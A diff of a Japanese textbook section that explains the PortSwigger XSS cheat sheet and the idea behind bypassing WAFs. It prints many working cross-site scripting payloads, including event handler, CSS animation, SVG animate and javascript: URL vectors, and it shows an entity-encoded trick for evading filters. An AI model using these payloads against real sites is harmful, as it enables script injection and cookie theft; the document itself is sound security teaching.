@@ -2,1782 +2,949 @@
 
 ## PortSwigger XSSチートシート（WAFバイパスの発想）
 
-> ℹ️ **本節の資料取得についての注記（透明性のため）**: 本節が典拠とする PortSwigger の XSS チートシート本体（`https://portswigger.net/web-security/cross-site-scripting/cheat-sheet`）は、執筆環境のネットワーク下り（egress）プロキシによって `portswigger.net` ドメインへの直接アクセスがブロックされ、ページ本文を直接取得（WebFetch）できませんでした。そこで、**PortSwigger 自身が公開しているチートシートの元データ用 GitHub リポジトリ（`PortSwigger/xss-cheatsheet-data`）のスキーマ定義**、**そのデータを機械的に収集して生成された公開ワードリスト（`crawl3r/PortswiggerXSS` の `payloads.txt`。全6,046行から重複を除いた183種の正規化テンプレートを本節向けに抽出）**、および Web 検索で得られた PortSwigger Research の関連記事（"One XSS cheatsheet to rule them all"、"Our favourite community contributions to the XSS cheat sheet"、"SVG animate XSS vector"）のスニペットを突き合わせて、内容を復元・体系化し、Web セキュリティの専門知識で補完しています。ペイロードは可能な限り原典の形を保っていますが、チートシートは頻繁に更新される（原典は「2026 Edition」として更新継続中）ため、最新の細部・対応ブラウザ表は必ず出典 URL でご確認ください。実質的内容を復元できたため、本資料は「取得不可」としては扱っていません。
->
-> なお、PortSwigger は元データリポジトリで「このデータを使って他所でホストする派生チートシートを作ってほしくない」と明記しています。本節は**チートシートを丸写しするのではなく、そこに込められた「発想（mindset）」を教育目的で解説し、原理を理解するために代表的なベクトルだけを引用**する方針を取っています。網羅的な一覧が必要なときは、必ず原典のインタラクティブ版を参照してください。
+前章で見た「反射型・格納型・DOMベース」という3分類は、あくまで「攻撃コードがどの経路で被害者のブラウザに届くか」という**入口側の分類**でした。本節ではいったん入口の話から離れ、いざ注入できるポイントが見つかったとき、**実際にどんなペイロード（攻撃コード片）を試すか**という「出口側」の話に踏み込みます。題材は PortSwigger が公開・継続更新している **XSSチートシート**（Cross-Site Scripting (XSS) cheat sheet）です。このリソースは単なる「コピペ用ペイロード集」ではなく、**「なぜそのペイロードがWAF（Web Application Firewall＝アプリの手前に置かれ、既知の攻撃パターンをシグネチャやルールで検知・遮断するフィルタ装置）やサニタイザをすり抜けられるのか」という発想そのもの**を教材化した資料です。本節ではこの「発想」を、HTMLパーサの動作原理とセットで解体していきます。
 
-この節では、PortSwigger の **XSS チートシート（cheat sheet＝攻撃に使える「ベクトル〔攻撃文字列のパターン〕」を体系的に集めた早見表）** を題材に、単なるペイロード集としてではなく、**「WAF（Web Application Firewall＝アプリの手前で悪意ある通信を検知・遮断する仕組み）やフィルタをどうやって出し抜くか」という発想の枠組み**として読み解きます。反射型の素朴な `<script>alert(1)</script>` が通らなくなった、その先で戦うための「引き出し」を、なぜそれが動くのかという**ブラウザの HTML パーサ（構文解析器）の挙動レベル**まで掘り下げて整理します。この「なぜ」の理解こそが、シグネチャ（既知の攻撃パターンの指紋）に頼る自動 WAF・自動スキャナに勝つための核心です。
+### チートシートの位置づけと成り立ち
 
----
+PortSwiggerの研究者 Gareth Heyes は2019年9月26日、リサーチブログ記事「One XSS cheatsheet to rule them all」を公開し、その後継として現在も更新され続けている `portswigger.net/web-security/cross-site-scripting/cheat-sheet` を発表しました。この記事は設計思想を次のように説明しています。
 
-### このチートシートは何か・どう使うか
+> 出典: One XSS cheatsheet to rule them all — https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
 
-PortSwigger の XSS チートシートは、同社の研究者 Gareth Heyes を中心とする PortSwigger Research が、**「HTML フィルタと WAF をバイパスして XSS を達成するための情報を、世界で最も網羅的な形で一箇所に集め、かつ使いやすく提示する」** という明確な目的で作った早見表です。次の特徴を押さえておくと、実務での使い方が一気に明確になります。
+このリソースの主眼は、**「HTMLフィルタとWAF回避に関する、最も包括的な情報バンクを構築する」**ことにありました。それ以前にもXSSペイロード集はいくつも存在していましたが、多くは「動くはずのタグとイベントハンドラの組み合わせ」を静的に列挙するだけで、**実際にどのブラウザでそのベクタが動くのか検証されていない**、あるいは古いブラウザ挙動を前提にしたまま更新が止まっている、という弱点を抱えていました。Heyes のアプローチは、これを**自動ファジング（fuzzing、＝大量の入力パターンを機械的に生成してプログラムに投げ、クラッシュや予期しない挙動を探る手法）と手動調査を組み合わせる**ことで解決する、というものです。具体的には、考えうるタグ・属性・イベントハンドラの組み合わせを実ブラウザ（Chrome・Firefox・Safari・IE等)上で総当たり的に実行し、実際にJavaScriptが起動した組み合わせだけを「動作確認済みベクタ」としてデータベース化しています。この結果、**手作業では気づきにくい新規ベクタ**が複数発見され、それが「WAFフィルタ突破に効果的な武器」としてチートシートに追加されていきました。
 
-- **すべてのベクトルに、実際に動く PoC（Proof of Concept＝概念実証。ブラウザで開くと本当に発火するデモ）がホストされている。** 「理屈上は動くはず」ではなく「このブラウザで実際に動く」ことが確認済みです。
-- **「タグ（tag）」「イベント（event）」「ブラウザ」の3軸で絞り込める。** 例えば「`img` タグしか通らない状況で、Firefox で発火するベクトルは？」という具体的な制約から逆引きできます。これがチートシートの最大の実用価値です。
-- **各ベクトルに「対応ブラウザ」と「ユーザー操作の要否」が付いている。** 後述しますが、この2つのメタ情報が、攻撃を「本当に刺さるか」を左右します。
-- **自動ファジング（fuzzing＝大量の変異入力を機械的に投げて挙動の穴を探す手法）と手動探索の組み合わせ**で発見された、WAF・フィルタ回避に特に有効な新規ベクトルを多数含みます。
+現在のチートシート本体ページ（`/web-security/cross-site-scripting/cheat-sheet`）は2026年5月22日時点でも更新が続いており、ページ自体が「多くのベクトルを含むXSSチートシートで、WAFとフィルタ回避を助ける」ものであると明記しています。データはPDF版としてもダウンロード可能で、Twitter（@PortSwiggerRes）で更新情報が随時発信されます。
 
-> 出典: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
-> 出典: One XSS cheatsheet to rule them all（PortSwigger Research） — https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
+> 出典: Cross-Site Scripting (XSS) cheat sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
-#### データ構造を見ると「発想」が見える
+このチートシートを支える生データは、GitHubリポジトリ `PortSwigger/xss-cheatsheet-data` として公開されています。中身は主に `json` フォルダに格納された構造化データで、各ベクタは概ね次のような形で定義されています。
 
-チートシートの元データ（`PortSwigger/xss-cheatsheet-data`）は、イベントハンドラを起点に、それを発火できるタグとブラウザ対応を並べた JSON です。原典 README に載っている実際の定義例を引用します。
-
-```javascript
+```json
 "onwaiting": {
-    "description": "Fires when while waiting for the data",
-    "tags": [
-        {
-            "tag": "video",
-            "code": "<video autoplay controls onwaiting=alert(1)><source src=\"validvideo.mp4\" type=video/mp4></video>",
-            "browsers": [ "edge" ],
-            "interaction": false
-        }
-    ]
+  "description": "Fires when video/audio playback stops due to buffering",
+  "tags": ["video", "audio"],
+  "browsers": ["chrome", "firefox"],
+  "interaction": false
 }
 ```
 
-ここから読み取るべきは、チートシートが世界を **「イベント（`onwaiting` のような発火契機）× タグ（`video` のような入れ物）× ブラウザ（`edge`）× 操作要否（`interaction:false`＝ユーザー操作不要）」** という多次元の組み合わせ空間として捉えている、という点です。`browsers` は `chrome` / `safari` / `firefox` / `edge` の小文字表記で、`interaction` フラグはそのベクトルがユーザーのクリックやマウス移動などを必要とするか（`true`）、勝手に発火するか（`false`）を表します。**この組み合わせ空間の広さこそが、WAF バイパスが原理的に成立してしまう理由**です（次項）。
+つまり1つのイベントハンドラごとに、①発火条件の説明、②そのハンドラを持てるタグの一覧、③動作確認済みブラウザの一覧、④ユーザー操作（クリックやドラッグなど）が必要かどうかのフラグ、という4つの軸でデータが持たれています。この構造自体が「チートシートの発想」を体現しています。すなわち、**1つの正解ペイロードを暗記するのではなく、「タグ × イベント × ブラウザ × 操作有無」という多次元の組み合わせ空間から、フィルタの穴に一致するものを検索して選び出す**、という使い方を前提に設計されているのです。コミュニティからのプルリクエストも受け付けており、重複ベクタを避けるため事前のデータ検索が推奨されています。
 
-> 出典: xss-cheatsheet-data（PortSwigger 公式データリポジトリ） — https://github.com/PortSwigger/xss-cheatsheet-data
+> 出典: PortSwigger/xss-cheatsheet-data (GitHub) — https://github.com/PortSwigger/xss-cheatsheet-data
 
----
+### なぜ「タグ×イベント×ブラウザ」の組み合わせ表がWAFバイパスの武器になるのか
 
-### WAFバイパスの中心思想：「ブロックリストは必ず穴が開く」
+ここでいったん原理に戻ります。WAFやアプリ側のブラックリスト型サニタイザ（sanitizer、＝入力から危険な文字列やパターンを除去・無害化する処理)の多くは、**「よく使われる攻撃パターン」を有限個のシグネチャとして持ち、それに一致する文字列を拒否する**という設計です。典型的には次のようなパターンがブロック対象になります。
 
-WAF や素朴な XSS フィルタの多くは、**ブロックリスト（blocklist＝「危険な文字列」を列挙して一致したら弾く方式）** で動いています。「`<script` を含んだら弾く」「`onerror` を含んだら弾く」「`javascript:` を含んだら弾く」といった具合です。チートシートの発想の中心は、**このブロックリストが列挙しきれないほど、XSS を起こす手段は膨大にある**という事実を突きつけることにあります。
+- `<script>` タグそのもの
+- `javascript:` スキーム
+- `onerror=`、`onload=` など「よく見る」イベントハンドラ名
+- `alert(`、`eval(` のような「いかにも」な関数呼び出し
 
-本節で復元した実データを数えると、チートシートが扱うベクトルの素材は次の規模です。
+しかし、HTML仕様（WHATWGのHTML Living Standard）が定義するイベントハンドラ属性は数百種類に及び、しかもその集合は**ブラウザのバージョンアップやCSS/DOM APIの新機能追加のたびに増え続けます**。WAFのシグネチャは「過去に観測された攻撃」や「有名なペイロード集」を元に作られることが多いため、**新しく仕様に追加されたイベントハンドラや、あまり使われないタグとの組み合わせ**は往々にしてシグネチャの対象外になっています。チートシートが「タグ×イベントの全組み合わせを機械的に洗い出す」というアプローチを取るのは、まさにこの**シグネチャのカバレッジの穴を体系的に探すため**です。個々のベクタを覚えることよりも、「この発想でイベントハンドラ一覧やタグ一覧を定期的に洗い直せば、フィルタの更新が追いつかない新しいベクタが見つかる」という**方法論そのもの**がチートシートの本質的な価値です。
 
-- **スクリプト実行の「入れ物」になりうるタグ: 142種**（`a`, `abbr`, `div`, `img`, `svg`, `math`, `iframe`, `object`, `embed` … さらに実在しない独自要素 `<xss>` まで）。
-- **発火契機となるイベントハンドラ: 84種以上**（`onclick` のような定番から、`onwaiting`・`onunhandledrejection`・`ontransitioncancel` のような珍しいものまで。後述するコミュニティ貢献の `onpointer*` 系を加えるとさらに増える）。
-- **これらを掛け合わせた具体的な PoC テンプレート: 183種**（同じイベントでも「autofocus で自動発火」「CSS アニメーションで自動発火」など複数の実現形がある）。
+同時に、ブラウザ間の実装差もバイパスの資源になります。あるベクタが「Chrome専用」「Firefox専用」「Safari専用」としか動かない場合、汎用的なWAFルールでは検知しづらい一方、**攻撃者は被害者が使うブラウザを想定して1つだけ動けばよい**ため、実運用上は十分な脅威になります。逆に防御側の視点では、「主要ブラウザの1つでも実行できるベクタは通す/通さない」という判断をフィルタ設計者がしなければならず、これがブラックリスト方式の構造的な弱さを物語っています。
 
-単純化して掛け算すれば「入口の数」は数千通りに達します。WAF がこの全パターンを漏れなくブロックしつつ、正規のリッチテキスト入力を壊さないようにするのは現実的に不可能です。**攻撃者は1つ通ればよく、防御側は全部を塞がねばならない**——この非対称性が、ブロックリスト型防御の構造的な敗因です。だからこそ本書は繰り返し「防御はブロックリストではなく、出力エンコーディング（出力時に危険な文字を無害な表現に変換する）と、CSP／Trusted Types のような許可リスト型（allowlist）の多層防御で行うべき」と説きます（詳細は第8章）。
+### 具体的なベクタ例と「なぜ動くか」
 
-チートシートを「使う」とは、この巨大な組み合わせ空間の中から、**目の前のフィルタがたまたま塞ぎ忘れている一点を素早く見つける**作業に他なりません。
+チートシートは大きく「ユーザー操作が不要なイベント」「ユーザー操作が必要なイベント」「タグを消費させる手法」「JavaScriptのホイスティング」「ファイルアップロード経由の攻撃」「制限文字がある場合の工夫」「フレームワーク別の手法」「プロトコルの悪用」「特殊タグ」「エンコーディング・難読化」「クライアントサイドテンプレート注入」といった節に分かれています。以下、代表的なものを原理とセットで見ていきます。
 
-> 出典: One XSS cheatsheet to rule them all（PortSwigger Research） — https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
+#### ユーザー操作不要で発火するイベントハンドラ
 
----
-
-### スクリプトを実行できる「入口」：タグの体系
-
-「JavaScript を実行させる」入口は、大きく4系統に整理できます。フィルタが1系統を塞いでも、別系統に乗り換えるのが基本戦術です。
-
-#### 1. `<script>` による直接実行
-
-最も素直な入口です。
+もっとも攻撃者にとって都合が良いのは、**被害者が何もクリックしなくても自動的にJavaScriptが実行される**ベクタです。
 
 ```html
-<script>alert(document.domain)</script>
-```
-
-- **なぜ動くか**: ブラウザの HTML パーサは `<script>` 開始タグを見つけると、そこから `</script>` までを「テキスト」ではなく「実行すべき JavaScript」として扱う特別なモード（scriptデータ状態）に入るためです。出所が開発者か攻撃者かは一切問われません。
-- ただし現代の WAF はまず `<script` を弾くので、**実戦ではむしろ通らない前提**で考え、以下の系統に進みます。
-
-#### 2. 属性のイベントハンドラ経由（最重要・本命）
-
-タグそのものは無害でも、**イベントハンドラ属性（`onXXX=` の形で、特定の出来事が起きたときに JavaScript を実行する属性）** を付ければスクリプトが走ります。これがチートシートの主戦場です。
-
-```html
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
 <body onload=alert(1)>
-<xss onpointerover=alert(1)>マウスを乗せて</xss>
 ```
 
-- **なぜ動くか**: `onerror` などの属性値は「イベントが発火したときに評価される JavaScript コード」として登録されます。`<img src=x>` は存在しない画像 `x` の読み込みに失敗し、その瞬間 `onerror` が発火します。**`<script` という文字列を1文字も使わずにコードを実行できる**のが強みで、`<script` だけを弾く WAF を素通りします。
-- 最後の例のように、**実在しない独自タグ `<xss>` でもイベントハンドラは機能します**（HTML パーサは未知のタグを「不明な要素」として DOM に配置し、イベントハンドラ属性はそれでも有効になるため）。「既知の危険タグ名」を列挙して弾くフィルタに対する定番の抜け道です。
-
-#### 3. `javascript:` プロトコル経由
-
-URL を受け取る属性（`href`・`src`・`action`・`data` など）に、`http:` ではなく **`javascript:` スキーム（ブラウザが「これに続く文字列を JavaScript として実行する」と解釈する擬似プロトコル）** を入れる入口です。
+`onload` は要素（ここでは `<body>`）の読み込みが完了した時点で発火するイベントハンドラです。ページがブラウザに描画される過程で必ず通る処理なので、被害者の操作を一切必要とせず、全ブラウザで対応しています。同様の考え方で、リソース読み込みの失敗を利用する定番が次のベクタです。
 
 ```html
-<a href="javascript:alert(document.cookie)">クリック</a>
-<iframe src="javascript:alert(1)"></iframe>
-<form action="javascript:alert(1)"><button>送信</button></form>
-<object data="javascript:alert(1)"></object>
-<button formaction="javascript:alert(1)">送信</button>
+<audio src/onerror=alert(1)>
 ```
 
-- **なぜ動くか**: これらの属性はブラウザにとって「ナビゲーション先の URL」です。ユーザーがリンクをクリックしたりフォームを送信したりして、その URL へ「移動」しようとした瞬間、ブラウザは `javascript:` を検出してスキームの後続部分をコードとして実行します。
-- **注意（陳腐化）**: モダンブラウザは安全性向上のため、`javascript:` を許す文脈を年々狭めています。トップレベルの `<iframe src=javascript:>` やアドレスバー直打ちの `javascript:` は現在ほぼ無効化されており、`<a href>` のクリック起点や一部の属性など限られた文脈でしか動きません。「昔は動いた」ベクトルが現在の Chrome/Firefox で動くとは限らないため、**必ずチートシートのブラウザ列と PoC で現物確認**してください。
+`<audio>` タグに存在しない・不正な `src`（`src` 属性の値が空、つまり `src/onerror=...` という属性名の並びとして解釈される点に注目してください)を与えると、ブラウザは「音声ファイルの取得に失敗した」と判断して `onerror` イベントを発火させます。**存在しないリソースをわざと参照させて、その失敗をトリガーにする**という発想は、`<img>`・`<video>`・`<iframe>` など「外部リソースを読み込む属性を持つタグ」全般に応用可能です。属性名を区切るのに厳密な `=値` の形を必要としない、HTMLのゆるい属性パーシング規則（属性はスペースや `/` で区切られていれば値なしの真偽属性として解釈されうる)を突いている点が「原理レベル」でのポイントです。
 
-#### 4. リソース読み込みタグの読み込みライフサイクル（自動実行系）
-
-`img`・`script`・`link`・`object`・`video`・`audio`・`iframe` などは「外部リソースを読みに行く」タグです。この**読み込みの成功・失敗・進行**そのものがイベントを発火させます。
+CSSアニメーションの完了イベントを使う、より発見されにくい系統のベクタもあります。
 
 ```html
-<img src=validimage.png onload=alert(1)>
-<img src=1 onerror=alert(1) type=image/gif>
-<link href=validstyles.css rel=stylesheet onload=alert(1)>
-<object data=/ onload=alert(1)>
-<object data=/ onreadystatechange=alert(1)>
-<style>@import 'x';</style>  <!-- 読み込み系の一例 -->
-<video src=validimage.png onloadstart=alert(1)>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)">
 ```
 
-- **なぜ動くか**: ブラウザはこれらのタグを DOM に組み込むと同時に、指定リソースの取得（フェッチ）を非同期に開始します。取得の各段階（開始 `onloadstart`、完了 `onload`／`onloadend`、失敗 `onerror`、状態変化 `onreadystatechange`）でイベントが自動発火します。**ユーザー操作が一切不要**なため、後述する「自動実行ベクトル」の中核をなします。
+`<xss>` は存在しないカスタムタグ名ですが、HTMLパーサは**未知のタグでも「不明な要素（HTMLUnknownElement）」として構文的に受け入れ、属性やイベントハンドラは通常通り解釈します**。ここに `@keyframes` で定義した空のアニメーション `x` を `animation-name` として適用すると、ブラウザはアニメーションの開始・終了処理を実行し、その完了時に `onanimationend` が発火します。**「危険な組み込みタグ」だけをブラックリストしているフィルタは、任意のタグ名+CSSアニメーション属性という組み合わせを見落としがち**であり、これがまさにチートシート的な「フィルタの穴の探し方」の実例です。Chrome・Firefox・Safariで対応が確認されています。
 
----
-
-### イベントハンドラの体系（84種以上）
-
-チートシートの真髄はイベントハンドラの網羅性にあります。復元した84種を用途別に整理すると、WAF が「よく知られた危険イベント」だけを弾いている場合の**乗り換え先**が見えてきます。以下は本節で復元した一覧です（`on` 接頭辞は共通）。
-
-- **マウス系**: `click` / `dblclick` / `mousedown` / `mouseup` / `mouseover` / `mouseout` / `mouseenter` / `mouseleave` / `mousemove` / `auxclick`（＝中クリック等の補助ボタン） / `contextmenu`（右クリック） / `wheel`（ホイール回転）
-- **ポインタ系（コミュニティ貢献で追加）**: `pointerover` / `pointerdown` / `pointerenter` / `pointerleave` / `pointermove` / `pointerout` / `pointerup`（マウス・タッチ・ペンを統合したイベント。WAF が `onmouseover` だけ弾いているとき `onpointerover` が通る、という古典的乗り換え）
-- **キーボード系**: `keydown` / `keyup` / `keypress`
-- **フォーカス系**: `focus` / `blur` / `focusin` / `focusout`（`autofocus` 属性と組み合わせると自動発火。後述）
-- **読み込み・リソース系**: `load` / `error` / `loadstart` / `loadend` / `loadeddata` / `loadedmetadata` / `readystatechange`
-- **メディア系**: `play` / `playing` / `pause` / `ended` / `canplay` / `canplaythrough` / `seeked` / `seeking` / `timeupdate` / `volumechange` / `waiting`（`<audio>`／`<video>` に `autoplay controls` を付けて自動再生させ、再生の各局面で発火させる）
-- **アニメーション／トランジション系**: `animationstart` / `animationend` / `animationcancel` / `animationiteration` / `transitionrun` / `transitionend` / `transitioncancel`（CSS だけで自動発火できる強力な系統。後述）
-- **SVG SMILアニメーション系**: `begin` / `end` / `repeat`（SVG の `<animate>` 等でのみ使う。後述）
-- **ドラッグ＆ドロップ系**: `drag` / `dragstart` / `dragend` / `dragenter` / `dragleave` / `dragover` / `drop`
-- **クリップボード系**: `copy` / `cut` / `paste` / `beforecopy` / `beforecut` / `beforepaste`
-- **フォーム系**: `submit` / `reset` / `change` / `input` / `select` / `invalid` / `search`
-- **ウィンドウ・文書系**: `hashchange` / `popstate` / `pageshow` / `message` / `beforeunload` / `resize` / `scroll` / `afterprint` / `beforeprint` / `unhandledrejection`
-- **旧IE系（レガシー）**: `activate` / `beforeactivate` / `deactivate` / `beforedeactivate`（Internet Explorer 時代のイベント。現代ブラウザでは動かないものが多いが、`onactivate` などはチートシートに網羅性のため収録。実戦利用は必ずブラウザ列で確認）
-- **`<marquee>` 系（レガシー）**: `bounce` / `finish` / `start`（廃止された `<marquee>` タグ専用の珍しいイベント）
-
-> 出典: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
-> 出典: Our favourite community contributions to the XSS cheat sheet（PortSwigger Research） — https://portswigger.net/research/our-favourite-community-contributions-to-the-xss-cheat-sheet
-
-**発想のポイント**: WAF は現実的に `onerror`・`onload`・`onclick`・`onmouseover` など「有名どころ」しか弾けません。上記の**珍しい方の70種以上**が、ほぼ手つかずで残っていることが多いのです。
-
----
-
-### ユーザー操作なしで発火させる技法（自動実行ベクトル）
-
-イベントハンドラの `interaction` フラグ（前述）が `false`、つまり**被害者がクリックもマウス移動もしなくても、ページを開いた瞬間（または URL のフラグメントに `#x` を付けるだけ）で勝手に発火する**ベクトルは、攻撃の破壊力が段違いです。反射型でリンクを踏ませるだけ、格納型なら閲覧させるだけで成立します。チートシートが磨き上げた「自動発火」の代表技法を、原理とともに挙げます。
-
-#### `autofocus` + `onfocus`：どんな要素でも自動フォーカス
-
-```html
-<input autofocus onfocus=alert(1)>
-<xss autofocus tabindex=1 onfocus=alert(1)>test</xss>
-```
-
-- **なぜ動くか**: `autofocus` 属性が付いた要素は、ページ表示時にブラウザが自動的にフォーカスを当てます。その瞬間 `onfocus` が発火します。`tabindex=1` を付ければ、本来フォーカスできない要素（独自タグ含む）もフォーカス可能になり、この技が使えます。ユーザー操作ゼロで動く定番です。
-
-#### `<img>`/`<script>` などの `onerror`/`onload`
-
-```html
-<img src=x onerror=alert(1)>
-<script src=validjs.js onload=alert(1)></script>
-```
-
-- **なぜ動くか**: 前述の「読み込みライフサイクル」により、リソース取得の失敗（`onerror`）や成功（`onload`）が自動で起きます。`src=x` のように壊れた URL を指定すれば確実に `onerror` が走ります。
-
-#### CSS アニメーションによる自動発火（`@keyframes` + `:target`）
-
-**どんなタグにも `onXXX` イベントを載せられない状況でも**、CSS アニメーションを利用すればアニメーション系イベントを自動発火できる、という発想の転換です。
-
-```html
-<style>@keyframes x{}</style>
-<xss style="animation-name:x" onanimationstart="alert(1)"></xss>
-```
-
-```html
-<style>@keyframes x{from {left:0;}to {left:1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style>
-<xss id=x style="position:absolute;" onanimationcancel="alert(1)"></xss>
-```
-
-- **なぜ動くか**: 1つ目は、空の `@keyframes x` を定義し、要素に `animation-name:x` を割り当てるだけでアニメーションが「開始」され、`onanimationstart` が**ページ表示直後に自動発火**します。2つ目の `onanimationcancel`・`onanimationiteration` はやや工夫が要り、`:target` セレクタ（URL のフラグメント `#x` が指す要素にだけ適用される CSS 疑似クラス）を使います。攻撃 URL の末尾に `#x` を付けて被害者に踏ませると、`id=x` の要素にアニメーションが適用され、アニメーションのキャンセル（別状態への遷移）時に `onanimationcancel` が発火します。**イベントハンドラ属性を「危険」と見なして削る**サニタイザ相手に、CSS 経由という別ルートで回り込む発想です。
-
-#### CSS トランジションによる自動発火（`:target` + `transition`）
-
-```html
-<style>:target {color:red;}</style>
-<xss id=x style="transition:color 1s" ontransitionend=alert(1)></xss>
-```
-
-- **なぜ動くか**: URL に `#x` を付けると `:target` により `id=x` の要素の色が変わり、`transition:color 1s` によってその変化が1秒かけてアニメーションします。トランジション完了時に `ontransitionend` が発火します。CSS の状態変化を発火源にする点が巧妙です。
-
-#### SVG SMIL アニメーションによる自動発火（`<animate>` 系）
+SVG特有の時間軸ベースのアニメーション要素を使う手もあります。
 
 ```html
 <svg><animate onbegin=alert(1) attributeName=x dur=1s>
-<svg><animateTransform onbegin=alert(1) attributeName=transform>
-<svg><animate onend=alert(1) attributeName=x dur=1s>
-<svg><animateMotion onbegin=alert(1) dur=1s repeatCount=1>
 ```
 
-- **なぜ動くか**: SVG は **SMIL（Synchronized Multimedia Integration Language＝SVG に組み込まれた時間ベースのアニメーション記述言語）** をサポートします。`<animate>` 等の要素は SVG が表示された瞬間にアニメーションを開始し、開始時 `onbegin`、終了時 `onend`、繰り返し時 `onrepeat` が**自動発火**します。`dur=1s`（再生時間）が付いていればユーザー操作は不要です。HTML の一般的なイベント名（`onload` 等）とは異なる SVG 専用イベントなので、HTML 前提のフィルタの盲点になりがちです。
+`<animate>` はSVGのアニメーション要素で、`attributeName` に対して指定期間 (`dur`) だけアニメーションを走らせます。アニメーションが**開始した瞬間**に `onbegin` が発火するため、`dur=1s` を待つことすらなく実行されます。SVG名前空間内の要素は通常のHTML要素とは別のタグ集合を持つため、**HTML側のタグブラックリストがSVG要素をカバーし忘れている**ケースで有効な回避策になります。
 
-#### `<details>`/`<dialog>` などのUI要素（補足）
-
-> （以下は取得できなかった資料の補足として、一般的な知識に基づく解説です。原典の該当ベクトルはブラウザ列で要確認）
-
-`<details open ontoggle=alert(1)>` は、`open` 属性を付けると表示直後に `ontoggle` が発火する自動実行ベクトルとして広く知られています。同様に、近年の HTML では Popover API に伴う `onbeforetoggle`/`ontoggle` など新しい発火契機が増え続けており、チートシートはこうした新イベントをコミュニティ貢献で取り込み続けています。**「新しいブラウザ機能＝新しい発火契機」であり、WAF のシグネチャ更新は常にそれに遅れる**——これが自動発火ベクトルが枯れない根本理由です。
-
----
-
-### SVGとMathML：名前空間という抜け道
-
-チートシートの中でも特に「なぜ動くか」の理解が価値を生むのが、**名前空間（namespace＝XML において、同じ要素名でも「どの語彙に属するか」を区別する仕組み。HTML・SVG・MathML はそれぞれ別の名前空間）** を利用したベクトル群です。
-
-#### なぜ SVG/MathML はフィルタをすり抜けるのか
-
-ブラウザの HTML パーサは、通常は「HTML 名前空間」で解析していますが、`<svg>` や `<math>` タグに入ると **「外部コンテンツ（foreign content）」モードに切り替わり、SVG／MathML の解析規則を適用**します。このモード内では、
-
-- 属性名の**大文字小文字が区別される**（`attributeName` のようなキャメルケースが意味を持つ。HTML 名前空間では属性名は小文字化される）。
-- `xlink:href` のような**名前空間プレフィックス付き属性**が使える。
-- HTML には存在しない `<animate>`・`<foreignObject>` などの要素と、それに固有のイベント（`onbegin` 等）が有効になる。
-
-サニタイザ（sanitizer＝入力の HTML から危険な要素・属性を除去して安全化するライブラリ）や WAF が「HTML の常識」だけで書かれていると、この名前空間切り替え後の世界を正しく扱えず、危険な属性を見落とします。これが SVG/MathML ベクトルの土台です（この現象を突き詰めると mXSS〔mutation XSS〕やサニタイザ回避になります。詳細は第4章）。
-
-#### SVG `<animate>` で `href` を後から書き換える WAF 混乱ベクトル
-
-PortSwigger Research が「SVG animate XSS vector」として紹介した、WAF バイパスの傑作です。
+`<audio>` の再生準備完了イベントを狙うパターンも紹介されています。
 
 ```html
-<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a></svg>
+<audio oncanplay=alert(1)><source src="validaudio.wav">
 ```
 
-- **なぜ動くか（仕組み）**:
-  1. `<a id=xss>` というリンク要素を用意し、`<animate>` の `xlink:href=#xss` でそのリンクを**アニメーションの対象**に指定します。
-  2. `attributeName=href` は「このリンクの `href` 属性を時間とともに書き換える」という指定です。
-  3. `values` 属性には、セミコロン区切りで**複数の値を時系列で**並べられます。ここに `javascript:alert(1)` を混ぜておくと、アニメーション進行中にリンクの `href` がその値に切り替わります。
-  4. ユーザーがリンク（"XSS" のテキスト）をクリックすると、その時点の `href`（＝`javascript:alert(1)`）へナビゲートしようとして実行されます。
-- **なぜ WAF が騙されるか**: 決め手は、`javascript:alert(1)` を**「一見まっとうな URL の一部」に埋め込む**点と、**`&semi;`（セミコロンの HTML 実体参照）で文字を隠す**点です。WAF は `values` の中身を「`https://portswigger.net?...` で始まる正規の URL」と誤認し、`javascript:` プロトコルの直接出現を検知しそこねます（`&semi;` はブラウザだけが後で `;` にデコードする）。「危険な値を、正規の URL・クエリ・フラグメント・Basic 認証部などに紛れ込ませて WAF の目を逃れる」というのが、この系統の普遍的な発想です。
+`oncanplay` は「再生を開始できる程度にメディアがバッファされた」時点で発火します。**有効な音声ファイルを実際に用意する必要がある**という制約はありますが、`onerror` 系と違って「エラーになるリソース」を検知するタイプのフィルタ（例えば「存在しないファイル参照を怪しいと判定する」ヒューリスティック）を回避できる利点があります。
 
-#### `attributeName=href` と `xlink:href`：サニタイザ回避
+#### ユーザー操作が必要なイベント
 
-サニタイザが「`href` という文字列だけ」をチェックしている場合、`attributeName="xlink:href"` と書けば、名前空間プレフィックス付きの別表記で同じ効果を得つつ検査をすり抜けられます。この「同じ意味を持つ別表記」の存在が、文字列一致型の検査を破ります。
-
-> ⚠️ **一部関連資料は未取得**: PortSwigger Research の "SVG animate XSS vector"（`https://portswigger.net/research/svg-animate-xss-vector`）および技術ブログ "XSS fun with animated SVG"（`https://blog.isec.pl/xss-fun-with-animated-svg/`）は自動取得できませんでした（理由: `portswigger.net` および該当ドメインが egress プロキシによりブロック）。上記のベクトルと解説は検索スニペットと専門知識で復元したものです。正確な原文は各 URL からご確認ください。
-
-**この系統は「現役」で、しかも進化中**という点が重要です。近年の実例として、Angular の HTML サニタイザが SVG アニメーション・SVG URL・MathML 属性経由の格納型 XSS に対して脆弱だった **CVE-2025-66412（2025年公開）**、Roundcube Webmail の SVG animate サニタイザ回避 **CVE-2025-68461（2025年公開）**、SiYuan の `<animate>` 要素経由の未認証 XSS などが報告されています。**「SVG animate＝古い小ネタ」ではなく、2025年時点でも著名 OSS を落とし続けている現役の攻撃面**であることを、バージョン・公開年とともに記憶してください。
-
-> 出典: Angular Stored XSS via SVG Animation/URL/MathML（CVE-2025-66412, 2025年） — https://github.com/angular/angular/security/advisories/GHSA-v4hv-rgfq-gp49
